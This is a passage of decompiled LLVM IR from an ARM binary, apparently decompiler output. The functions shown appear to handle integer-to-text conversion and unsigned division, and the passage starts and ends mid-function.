  %v22_13188 = ptrtoint i32* %stack_var_-28 to i32
  %v0_1318c = load i32, i32* @r2, align 4
  store i32 %v0_1318c, i32* %r8.global-to-local, align 4
  %v2_1318c = icmp eq i32 %v0_1318c, 0
  store i1 %v2_1318c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v2_1318c, label %dec_label_pc_1327c, label %dec_label_pc_1319c

dec_label_pc_1319c:                               ; preds = %dec_label_pc_13188
  %v3_1319c = icmp eq i8 %arg1, 0
  store i1 %v3_1319c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1319c, label %.thread, label %dec_label_pc_131b0

.thread:                                          ; preds = %dec_label_pc_1319c
  %v4_131a4 = inttoptr i32 %v0_1318c to i8*
  store i8 48, i8* %v4_131a4, align 1
  %v0_131a8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_131a8.pr.pr, label %.thread1, label %dec_label_pc_131b0

.thread1:                                         ; preds = %.thread
  %v4_131a8 = load i32, i32* %r8.global-to-local, align 4
  %v5_131a8 = add i32 %v4_131a8, 1
  %v6_131a8 = inttoptr i32 %v5_131a8 to i8*
  store i8 0, i8* %v6_131a8, align 1
  %v0_131ac.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_131ac.pr.pr, label %dec_label_pc_1327c, label %dec_label_pc_131b0

dec_label_pc_131b0:                               ; preds = %dec_label_pc_1319c, %.thread, %.thread1
  %v7_131b4 = icmp eq i32 %arg2, 10
  store i1 %v7_131b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_131b4, label %bb, label %.thread21

.thread21:                                        ; preds = %dec_label_pc_131b0
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_131b0
  %tmp39 = icmp slt i8 %arg1, 0
  %phitmp = icmp eq i1 %tmp39, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  br i1 %phitmp, label %.thread4, label %dec_label_pc_131d8

.thread4:                                         ; preds = %bb, %.thread21
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_131e8

dec_label_pc_131d8:                               ; preds = %bb
  %v2_131d8 = sub nsw i32 0, %tmp
  store i32 %v2_131d8, i32* %r4.global-to-local, align 4
  store i1 %v3_1319c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1319c, label %dec_label_pc_13288, label %dec_label_pc_131e8

dec_label_pc_131e8:                               ; preds = %dec_label_pc_131d8, %.thread4
  %v0_131f010 = phi i32 [ %tmp, %.thread4 ], [ %v2_131d8, %dec_label_pc_131d8 ]
  %storemerge = phi i32 [ 0, %.thread4 ], [ 1, %dec_label_pc_131d8 ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r6.global-to-local, align 4
  %v2_131ec = ptrtoint i32* %stack_var_-30 to i32
  store i32 %v2_131ec, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_131f0

dec_label_pc_131f0:                               ; preds = %bb37, %dec_label_pc_131e8
  %v0_131f0 = phi i32 [ %v0_13214, %bb37 ], [ %v0_131f010, %dec_label_pc_131e8 ]
  store i32 %v0_131f0, i32* %r0.global-to-local, align 4
  %v0_131f4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_131f4, i32* %r1.global-to-local, align 4
  %sext = mul i32 %v0_131f0, 16777216
  %v1_131f8 = sdiv i32 %sext, 16777216
  %v3_131f8 = call i32 @function_133b0(i32 %v1_131f8, i32 %v0_131f4)
  store i32 %v3_131f8, i32* %r0.global-to-local, align 4
  %v7_131fc = icmp eq i32 %v3_131f8, 9
  store i1 %v7_131fc, i1* %cpsr_z.global-to-local, align 1
  %v1_13200 = add i32 %v3_131f8, 48
  %v0_13204 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13204, i32* @r1, align 4
  %v7_13208 = icmp sgt i32 %v3_131f8, 9
  %extract.t = trunc i32 %v1_13200 to i8
  br i1 %v7_13208, label %bb36, label %bb37

bb36:                                             ; preds = %dec_label_pc_131f0
  %v9_13208 = add i32 %v3_131f8, 55
  %extract.t20 = trunc i32 %v9_13208 to i8
  br label %bb37

bb37:                                             ; preds = %dec_label_pc_131f0, %bb36
  %v0_13210.off0 = phi i8 [ %extract.t, %dec_label_pc_131f0 ], [ %extract.t20, %bb36 ]
  %v0_1320c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1320c, i32* @r0, align 4
  %v2_13210 = load i32, i32* %r7.global-to-local, align 4
  %v3_13210 = inttoptr i32 %v2_13210 to i8*
  store i8 %v0_13210.off0, i8* %v3_13210, align 1
  %v4_13210 = load i32, i32* %r7.global-to-local, align 4
  %v5_13210 = add i32 %v4_13210, -1
  store i32 %v5_13210, i32* %r7.global-to-local, align 4
  %v0_13214 = call i32 @function_132a0()
  store i32 %v0_13214, i32* %r0.global-to-local, align 4
  store i32 %v0_13214, i32* %r4.global-to-local, align 4
  %v2_13218 = icmp eq i32 %v0_13214, 0
  store i1 %v2_13218, i1* %cpsr_z.global-to-local, align 1
  %v0_1321c = load i32, i32* %r6.global-to-local, align 4
  %v1_1321c = add i32 %v0_1321c, -1
  store i32 %v1_1321c, i32* %r6.global-to-local, align 4
  br i1 %v2_13218, label %dec_label_pc_13224, label %dec_label_pc_131f0

dec_label_pc_13224:                               ; preds = %bb37
  %v0_13224 = load i32, i32* %sl.global-to-local, align 4
  %v2_13224 = icmp eq i32 %v0_13224, 0
  store i1 %v2_13224, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13224, label %bb38, label %dec_label_pc_1328c

bb38:                                             ; preds = %dec_label_pc_13224
  store i32 %v0_1321c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13230

dec_label_pc_13230:                               ; preds = %bb38, %dec_label_pc_1328c
  %v1_1323c = phi i32 [ %v0_1321c, %bb38 ], [ %v1_13234.pre, %dec_label_pc_1328c ]
  %v2_13230 = ptrtoint i32* %stack_var_-62 to i32
  %v2_13234 = add i32 %v1_1323c, %v2_13230
  %v3_13234 = inttoptr i32 %v2_13234 to i8*
  %v4_13234 = load i8, i8* %v3_13234, align 1
  %v6_13234 = zext i8 %v4_13234 to i32
  %v2_13238 = icmp eq i8 %v4_13234, 0
  store i1 %v2_13238, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_13234, i32* %r1.global-to-local, align 4
  br i1 %v2_13238, label %dec_label_pc_13260, label %dec_label_pc_13244

dec_label_pc_13244:                               ; preds = %dec_label_pc_13230
  br label %dec_label_pc_13248

dec_label_pc_13248:                               ; preds = %dec_label_pc_13248, %dec_label_pc_13244
  %v0_13248 = phi i32 [ %v1_13248, %dec_label_pc_13248 ], [ 0, %dec_label_pc_13244 ]
  %v1_13248 = add i32 %v0_13248, 1
  store i32 %v1_13248, i32* @r2, align 4
  %v2_1324c = add i32 %v1_13248, %v2_13234
  %v3_1324c = inttoptr i32 %v2_1324c to i8*
  %v4_1324c = load i8, i8* %v3_1324c, align 1
  %v2_13250 = icmp eq i8 %v4_1324c, 0
  store i1 %v2_13250, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13250, label %dec_label_pc_13258, label %dec_label_pc_13248

dec_label_pc_13258:                               ; preds = %dec_label_pc_13248
  %v7_13258 = icmp eq i32 %v0_13248, -2
  store i1 %v7_13258, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13258, label %dec_label_pc_1327c, label %dec_label_pc_13260

dec_label_pc_13260:                               ; preds = %dec_label_pc_13258, %dec_label_pc_13230
  %v0_1326817 = phi i32 [ %v1_13248, %dec_label_pc_13258 ], [ %v6_13234, %dec_label_pc_13230 ]
  store i32 %v2_13234, i32* %r0.global-to-local, align 4
  %v0_13264 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_13264, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13268

dec_label_pc_13268:                               ; preds = %dec_label_pc_13268.dec_label_pc_13268_crit_edge, %dec_label_pc_13260
  %v2_13274 = phi i32 [ %v5_13274, %dec_label_pc_13268.dec_label_pc_13268_crit_edge ], [ %v0_13264, %dec_label_pc_13260 ]
  %v0_1326c = phi i32 [ %v0_1326c.pre, %dec_label_pc_13268.dec_label_pc_13268_crit_edge ], [ %v2_13234, %dec_label_pc_13260 ]
  %v0_13268 = phi i32 [ %v0_13268.pre, %dec_label_pc_13268.dec_label_pc_13268_crit_edge ], [ %v0_1326817, %dec_label_pc_13260 ]
  %v1_13268 = add i32 %v0_13268, -1
  store i32 %v1_13268, i32* @r2, align 4
  %v1_1326c = inttoptr i32 %v0_1326c to i8*
  %v2_1326c = load i8, i8* %v1_1326c, align 1
  %v5_1326c = add i32 %v0_1326c, 1
  store i32 %v5_1326c, i32* %r0.global-to-local, align 4
  %v3_13270 = icmp eq i32 %v0_13268, 0
  store i1 %v3_13270, i1* %cpsr_z.global-to-local, align 1
  %v3_13274 = inttoptr i32 %v2_13274 to i8*
  store i8 %v2_1326c, i8* %v3_13274, align 1
  %v4_13274 = load i32, i32* %r1.global-to-local, align 4
  %v5_13274 = add i32 %v4_13274, 1
  store i32 %v5_13274, i32* %r1.global-to-local, align 4
  br i1 %v3_13270, label %dec_label_pc_1327c, label %dec_label_pc_13268.dec_label_pc_13268_crit_edge

dec_label_pc_13268.dec_label_pc_13268_crit_edge:  ; preds = %dec_label_pc_13268
  %v0_13268.pre = load i32, i32* @r2, align 4
  %v0_1326c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13268

dec_label_pc_1327c:                               ; preds = %dec_label_pc_13268, %dec_label_pc_13258, %.thread1, %dec_label_pc_13188
  %v0_1327c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1327c, i32* %r0.global-to-local, align 4
  %v2_13284 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_13284, i32* @r4, align 4
  ret i32 %v0_1327c

dec_label_pc_13288:                               ; preds = %dec_label_pc_131d8
  store i32 32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1328c

dec_label_pc_1328c:                               ; preds = %dec_label_pc_13224, %dec_label_pc_13288
  %v1_13290 = phi i32 [ %v1_1321c, %dec_label_pc_13224 ], [ 32, %dec_label_pc_13288 ]
  %v2_13290 = add i32 %v1_13290, %v22_13188
  %v3_13298 = add i32 %v2_13290, -34
  %v4_13298 = inttoptr i32 %v3_13298 to i8*
  store i8 45, i8* %v4_13298, align 1
  %v1_13234.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13230

; uselistorder directives
  uselistorder i32 %v5_13274, { 1, 0 }
  uselistorder i1 %v3_13270, { 1, 0 }
  uselistorder i32 %v0_1326c, { 1, 0 }
  uselistorder i1 %v7_13258, { 1, 0 }
  uselistorder i32 %v1_13248, { 0, 1, 3, 2 }
  uselistorder i32 %v2_13234, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_13214, { 1, 2, 3, 0 }
  uselistorder i32 %v3_131f8, { 1, 0, 2, 3, 4 }
  uselistorder i1 %phitmp, { 1, 0 }
  uselistorder i1 %v3_1319c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1318c, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 4, 5, 7, 6, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 12, 11, 13, 14 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1328c, { 1, 0 }
  uselistorder label %dec_label_pc_13230, { 1, 0 }
  uselistorder label %bb37, { 1, 0 }
  uselistorder label %dec_label_pc_131b0, { 2, 1, 0 }
}

define i32 @function_132a0() local_unnamed_addr {
dec_label_pc_132a0:
  %v0_132a0 = load i32, i32* @r1, align 4
  %v1_132a0 = add i32 %v0_132a0, -1
  %v7_132a0 = icmp eq i32 %v0_132a0, 1
  br i1 %v7_132a0, label %bb, label %bb82

bb:                                               ; preds = %dec_label_pc_132a0
  %v2_132a4 = load i32, i32* @r0, align 4
  ret i32 %v2_132a4

bb82:                                             ; preds = %dec_label_pc_132a0
  %v2_132a0 = icmp eq i32 %v0_132a0, 0
  br i1 %v2_132a0, label %dec_label_pc_13388, label %dec_label_pc_132ac

dec_label_pc_132ac:                               ; preds = %bb82
  %v0_132ac = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_132ac, %v0_132a0
  br i1 %tmp, label %dec_label_pc_132b4, label %dec_label_pc_13340

dec_label_pc_132b4:                               ; preds = %dec_label_pc_132ac
  %v2_132b4 = and i32 %v1_132a0, %v0_132a0
  %v4_132b4 = icmp eq i32 %v2_132b4, 0
  br i1 %v4_132b4, label %dec_label_pc_1334c, label %dec_label_pc_132bc

dec_label_pc_132bc:                               ; preds = %dec_label_pc_132b4
  %v3_132bc = icmp ult i32 %v0_132a0, 536870912
  br i1 %v3_132bc, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_132bc
  %v4_132c0 = mul i32 %v0_132a0, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_132bc, %.thread
  %v0_132e0.pr36.ph = phi i32 [ %v4_132c0, %.thread ], [ %v0_132a0, %dec_label_pc_132bc ]
  %storemerge137 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_132bc ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb85
  %v0_132e0.pr36 = phi i32 [ %v4_132d4, %bb85 ], [ %v0_132e0.pr36.ph, %.preheader.preheader ]
  %v1_132d8 = phi i32 [ %v4_132d8, %bb85 ], [ %storemerge137, %.preheader.preheader ]
  %v2_132cc = icmp ugt i32 %v0_132e0.pr36, 268435455
  br i1 %v2_132cc, label %.thread2, label %bb83

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_132e0thread-pre-split.loopexit

bb83:                                             ; preds = %.preheader
  %v4_132d0 = icmp ult i32 %v0_132e0.pr36, %v0_132ac
  br i1 %v4_132d0, label %bb84, label %dec_label_pc_132e0thread-pre-split.loopexit.loopexit

bb84:                                             ; preds = %bb83
  %v2_132d4 = and i32 %v0_132e0.pr36, 268435456
  %v3_132d4 = icmp eq i32 %v2_132d4, 0
  %v4_132d4 = mul i32 %v0_132e0.pr36, 16
  br i1 %v3_132d4, label %bb85, label %dec_label_pc_132e0.loopexit

bb85:                                             ; preds = %bb84
  %v2_132d8 = and i32 %v1_132d8, 268435456
  %v3_132d8 = icmp eq i32 %v2_132d8, 0
  %v4_132d8 = mul i32 %v1_132d8, 16
  br i1 %v3_132d8, label %.preheader, label %dec_label_pc_132e0thread-pre-split.loopexit.loopexit

dec_label_pc_132e0thread-pre-split.loopexit.loopexit: ; preds = %bb85, %bb83
  %v1_132ec48.ph = phi i32 [ %v1_132d8, %bb83 ], [ %v4_132d8, %bb85 ]
  %v0_132e0.pr38.ph = phi i32 [ %v0_132e0.pr36, %bb83 ], [ %v4_132d4, %bb85 ]
  br label %dec_label_pc_132e0thread-pre-split.loopexit

dec_label_pc_132e0thread-pre-split.loopexit:      ; preds = %dec_label_pc_132e0thread-pre-split.loopexit.loopexit, %.thread2
  %v1_132ec48 = phi i32 [ %v1_132d8, %.thread2 ], [ %v1_132ec48.ph, %dec_label_pc_132e0thread-pre-split.loopexit.loopexit ]
  %v0_132e0.pr38 = phi i32 [ %v0_132e0.pr36, %.thread2 ], [ %v0_132e0.pr38.ph, %dec_label_pc_132e0thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_132e0thread-pre-split

dec_label_pc_132e0thread-pre-split:               ; preds = %dec_label_pc_132e0thread-pre-split.loopexit, %bb87
  %v1_132ec46 = phi i32 [ %v1_132ec48, %dec_label_pc_132e0thread-pre-split.loopexit ], [ %v3_132ec, %bb87 ]
  %v0_132e0.pr = phi i32 [ %v0_132e0.pr38, %dec_label_pc_132e0thread-pre-split.loopexit ], [ %v3_132e8, %bb87 ]
  br label %dec_label_pc_132e0

dec_label_pc_132e0.loopexit:                      ; preds = %bb84
  br label %dec_label_pc_132e0

dec_label_pc_132e0:                               ; preds = %dec_label_pc_132e0.loopexit, %dec_label_pc_132e0thread-pre-split
  %v1_132ec = phi i32 [ %v1_132ec46, %dec_label_pc_132e0thread-pre-split ], [ %v1_132d8, %dec_label_pc_132e0.loopexit ]
  %v1_132e8 = phi i32 [ %v0_132e0.pr, %dec_label_pc_132e0thread-pre-split ], [ %v4_132d4, %dec_label_pc_132e0.loopexit ]
  %v2_132e0 = icmp slt i32 %v1_132e8, 0
  br i1 %v2_132e0, label %dec_label_pc_132f4, label %bb86

bb86:                                             ; preds = %dec_label_pc_132e0
  %v4_132e4 = icmp ult i32 %v1_132e8, %v0_132ac
  br i1 %v4_132e4, label %bb87, label %dec_label_pc_132f4

bb87:                                             ; preds = %bb86
  %v3_132e8 = mul i32 %v1_132e8, 2
  %v2_132ec = icmp slt i32 %v1_132ec, 0
  %v3_132ec = mul i32 %v1_132ec, 2
  br i1 %v2_132ec, label %dec_label_pc_132f4, label %dec_label_pc_132e0thread-pre-split

dec_label_pc_132f4:                               ; preds = %bb86, %dec_label_pc_132e0, %bb87
  %v2_1330059 = phi i32 [ %v3_132ec, %bb87 ], [ %v1_132ec, %bb86 ], [ %v1_132ec, %dec_label_pc_132e0 ]
  %v1_132f851 = phi i32 [ %v3_132e8, %bb87 ], [ %v1_132e8, %bb86 ], [ %v1_132e8, %dec_label_pc_132e0 ]
  br label %dec_label_pc_132f8

dec_label_pc_132f8:                               ; preds = %.thread11, %dec_label_pc_132f4
  %v1_1332c = phi i32 [ %v4_1332c, %.thread11 ], [ %v2_1330059, %dec_label_pc_132f4 ]
  %v1_13300 = phi i32 [ %v0_13338, %.thread11 ], [ 0, %dec_label_pc_132f4 ]
  %v1_13330 = phi i32 [ %v4_13330, %.thread11 ], [ %v1_132f851, %dec_label_pc_132f4 ]
  %v1_132fc = phi i32 [ %v0_13328, %.thread11 ], [ %v0_132ac, %dec_label_pc_132f4 ]
  %v3_132f8 = icmp ult i32 %v1_132fc, %v1_13330
  br i1 %v3_132f8, label %.thread7, label %bb88

bb88:                                             ; preds = %dec_label_pc_132f8
  %v3_132fc = sub i32 %v1_132fc, %v1_13330
  %v3_13300 = or i32 %v1_13300, %v1_1332c
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_132f8, %bb88
  %v1_13308 = phi i32 [ %v1_132fc, %dec_label_pc_132f8 ], [ %v3_132fc, %bb88 ]
  %v1_1330c = phi i32 [ %v1_13300, %dec_label_pc_132f8 ], [ %v3_13300, %bb88 ]
  %v4_13304 = udiv i32 %v1_13330, 2
  %v6_13304 = icmp ult i32 %v1_13308, %v4_13304
  br i1 %v6_13304, label %.thread8, label %bb89

bb89:                                             ; preds = %.thread7
  %v3_13308 = urem i32 %v1_13330, 2
  %v4_13308 = icmp eq i32 %v3_13308, 0
  %v6_13308 = sub i32 %v1_13308, %v4_13304
  br i1 %v4_13308, label %.thread8, label %bb90

bb90:                                             ; preds = %bb89
  %v5_1330c = udiv i32 %v1_1332c, 2
  %v6_1330c = or i32 %v1_1330c, %v5_1330c
  br label %.thread8

.thread8:                                         ; preds = %bb89, %.thread7, %bb90
  %v1_13314 = phi i32 [ %v6_13308, %bb89 ], [ %v1_13308, %.thread7 ], [ %v6_13308, %bb90 ]
  %v1_13318 = phi i32 [ %v1_1330c, %bb89 ], [ %v1_1330c, %.thread7 ], [ %v6_1330c, %bb90 ]
  %v4_13310 = udiv i32 %v1_13330, 4
  %v6_13310 = icmp ult i32 %v1_13314, %v4_13310
  br i1 %v6_13310, label %.thread9, label %bb91

bb91:                                             ; preds = %.thread8
  %v3_13314 = and i32 %v1_13330, 2
  %v4_13314 = icmp eq i32 %v3_13314, 0
  %v6_13314 = sub i32 %v1_13314, %v4_13310
  br i1 %v4_13314, label %.thread9, label %bb92

bb92:                                             ; preds = %bb91
  %v5_13318 = udiv i32 %v1_1332c, 4
  %v6_13318 = or i32 %v1_13318, %v5_13318
  br label %.thread9

.thread9:                                         ; preds = %bb91, %.thread8, %bb92
  %v1_13320 = phi i32 [ %v6_13314, %bb91 ], [ %v1_13314, %.thread8 ], [ %v6_13314, %bb92 ]
  %v1_13324 = phi i32 [ %v1_13318, %bb91 ], [ %v1_13318, %.thread8 ], [ %v6_13318, %bb92 ]
  %v4_1331c = udiv i32 %v1_13330, 8
  %v6_1331c = icmp ult i32 %v1_13320, %v4_1331c
  br i1 %v6_1331c, label %thread-pre-split, label %bb93

bb93:                                             ; preds = %.thread9
  %v3_13320 = and i32 %v1_13330, 4
  %v4_13320 = icmp eq i32 %v3_13320, 0
  %v6_13320 = sub i32 %v1_13320, %v4_1331c
  br i1 %v4_13320, label %thread-pre-split, label %bb94

bb94:                                             ; preds = %bb93
  %v5_13324 = udiv i32 %v1_1332c, 8
  %v6_13324 = or i32 %v1_13324, %v5_13324
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb94, %.thread9, %bb93
  %v0_13338 = phi i32 [ %v1_13324, %bb93 ], [ %v1_13324, %.thread9 ], [ %v6_13324, %bb94 ]
  %v0_13328 = phi i32 [ %v6_13320, %bb93 ], [ %v1_13320, %.thread9 ], [ %v6_13320, %bb94 ]
  %v2_13328 = icmp eq i32 %v0_13328, 0
  br i1 %v2_13328, label %dec_label_pc_13338, label %bb95

bb95:                                             ; preds = %thread-pre-split
  %tmp142 = icmp ult i32 %v1_1332c, 16
  br i1 %tmp142, label %dec_label_pc_13338, label %.thread11

.thread11:                                        ; preds = %bb95
  %v4_1332c = udiv i32 %v1_1332c, 16
  %v4_13330 = udiv i32 %v1_13330, 16
  br label %dec_label_pc_132f8

dec_label_pc_13338:                               ; preds = %thread-pre-split, %bb95
  ret i32 %v0_13338

dec_label_pc_13340:                               ; preds = %dec_label_pc_132ac
  %v9_132ac = icmp eq i32 %v0_132ac, %v0_132a0
  %. = zext i1 %v9_132ac to i32
  ret i32 %.

dec_label_pc_1334c:                               ; preds = %dec_label_pc_132b4
  %v2_1334c = icmp ugt i32 %v0_132a0, 65535
  br i1 %v2_1334c, label %bb99, label %.thread16

bb99:                                             ; preds = %dec_label_pc_1334c
  %v2_13350 = and i32 %v0_132a0, 32768
  %v3_13350 = icmp eq i32 %v2_13350, 0
  %v4_13350 = udiv i32 %v0_132a0, 65536
  br i1 %v3_13350, label %.thread16, label %bb100

.thread16:                                        ; preds = %bb99, %dec_label_pc_1334c
  %v0_1335c65 = phi i32 [ %v0_132a0, %dec_label_pc_1334c ], [ %v4_13350, %bb99 ]
  br label %bb100

bb100:                                            ; preds = %bb99, %.thread16
  %v1_13360 = phi i32 [ %v0_1335c65, %.thread16 ], [ %v4_13350, %bb99 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb99 ]
  %v2_1335c = icmp ugt i32 %v1_13360, 255
  br i1 %v2_1335c, label %bb101, label %.thread17

bb101:                                            ; preds = %bb100
  %v2_13360 = and i32 %v1_13360, 128
  %v3_13360 = icmp eq i32 %v2_13360, 0
  %v4_13360 = udiv i32 %v1_13360, 256
  br i1 %v3_13360, label %.thread17, label %bb102

bb102:                                            ; preds = %bb101
  %v2_13364 = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb101, %bb100, %bb102
  %v1_13370 = phi i32 [ %storemerge, %bb100 ], [ %storemerge, %bb101 ], [ %v2_13364, %bb102 ]
  %v1_1336c = phi i32 [ %v1_13360, %bb100 ], [ %v4_13360, %bb101 ], [ %v4_13360, %bb102 ]
  %v2_13368 = icmp ugt i32 %v1_1336c, 15
  br i1 %v2_13368, label %bb103, label %.thread18

bb103:                                            ; preds = %.thread17
  %v2_1336c = and i32 %v1_1336c, 8
  %v3_1336c = icmp eq i32 %v2_1336c, 0
  %v4_1336c = udiv i32 %v1_1336c, 16
  br i1 %v3_1336c, label %.thread18, label %bb104

bb104:                                            ; preds = %bb103
  %v2_13370 = add nsw i32 %v1_13370, 4
  br label %.thread18

.thread18:                                        ; preds = %bb103, %.thread17, %bb104
  %v4_13378 = phi i32 [ %v1_13370, %.thread17 ], [ %v1_13370, %bb103 ], [ %v2_13370, %bb104 ]
  %v5_1337c = phi i32 [ %v1_1336c, %.thread17 ], [ %v4_1336c, %bb103 ], [ %v4_1336c, %bb104 ]
  %v2_13374 = icmp ugt i32 %v5_1337c, 3
  %v7_13374 = icmp eq i32 %v5_1337c, 4
  %v2_13378 = xor i1 %v7_13374, true
  %v3_13378 = and i1 %v2_13374, %v2_13378
  br i1 %v3_13378, label %bb105, label %bb106

bb105:                                            ; preds = %.thread18
  %v5_13378 = add nsw i32 %v4_13378, 3
  br label %bb106

bb106:                                            ; preds = %.thread18, %bb105
  %v4_1337c = phi i32 [ %v4_13378, %.thread18 ], [ %v5_13378, %bb105 ]
  %v2_1337c = xor i1 %v2_13374, true
  %v3_1337c = or i1 %v7_13374, %v2_1337c
  br i1 %v3_1337c, label %bb107, label %bb108

bb107:                                            ; preds = %bb106
  %v8_1337c = udiv i32 %v5_1337c, 2
  %v9_1337c = add i32 %v4_1337c, %v8_1337c
  br label %bb108

bb108:                                            ; preds = %bb106, %bb107
  %v1_13380 = phi i32 [ %v4_1337c, %bb106 ], [ %v9_1337c, %bb107 ]
  %v6_13380 = lshr i32 %v0_132ac, %v1_13380
  ret i32 %v6_13380

dec_label_pc_13388:                               ; preds = %bb82
  %v0_13388 = load i32, i32* @lr, align 4
  %v0_1338c = call i32 @function_13560()
  store i32 0, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v0_13388)
  %v9_13398 = load i32, i32* @lr, align 4
  %v0_1339c = call i32 @function_132a0()
  store i32 %v9_13398, i32* @lr, align 4
  ret i32 %v0_1339c

; uselistorder directives
  uselistorder i32 %v4_1337c, { 1, 0 }
  uselistorder i1 %v7_13374, { 1, 0 }
  uselistorder i32 %v4_1336c, { 1, 0 }
  uselistorder i32 %v1_1336c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13360, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_13360, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13350, { 1, 0 }
  uselistorder i32 %v0_13328, { 1, 0 }
  uselistorder i32 %v4_1331c, { 1, 0 }
  uselistorder i32 %v1_13324, { 1, 2, 0 }
  uselistorder i32 %v4_13310, { 1, 0 }
  uselistorder i32 %v1_13318, { 1, 2, 0 }
  uselistorder i32 %v4_13304, { 1, 0 }
  uselistorder i32 %v1_1330c, { 1, 2, 0 }
  uselistorder i32 %v1_13330, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_13300, { 1, 0 }
  uselistorder i32 %v1_1332c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_132ec, { 1, 0 }
  uselistorder i32 %v3_132e8, { 1, 0 }
  uselistorder i32 %v1_132e8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_132ec, { 1, 2, 0, 3 }
  uselistorder i32 %v4_132d8, { 1, 0 }
  uselistorder i32 %v4_132d4, { 2, 1, 0 }
  uselistorder i32 %v1_132d8, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_132e0.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_132ac, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_132a0, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1, 10, 12, 11 }
  uselistorder i32 65535, { 92, 47, 48, 0, 1, 11, 49, 24, 50, 23, 51, 22, 52, 12, 13, 2, 26, 53, 25, 54, 55, 14, 56, 3, 27, 57, 28, 58, 29, 59, 60, 4, 30, 61, 62, 15, 63, 5, 34, 64, 31, 65, 32, 66, 33, 67, 68, 16, 69, 6, 70, 71, 38, 72, 37, 73, 35, 74, 36, 75, 17, 18, 7, 76, 39, 77, 40, 78, 79, 80, 19, 81, 82, 8, 43, 83, 41, 84, 42, 85, 86, 20, 87, 9, 10, 46, 88, 44, 89, 45, 90, 21, 91 }
  uselistorder label %bb108, { 1, 0 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb100, { 1, 0 }
  uselistorder label %dec_label_pc_13338, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_132f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_132e0thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @function_133b0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_133b0:
  store i32 %arg1, i32* @r0, align 4
  %v1_133b0 = add i32 %arg2, -1
  %v2_133b0 = icmp eq i32 %arg2, 0
  br i1 %v2_133b0, label %dec_label_pc_1346c, label %dec_label_pc_133b8

dec_label_pc_133b8:                               ; preds = %dec_label_pc_133b0
  %v7_133b0 = icmp eq i32 %arg2, 1
  br i1 %v7_133b0, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_133b8
  %v1_133b8 = load i32, i32* @r0, align 4
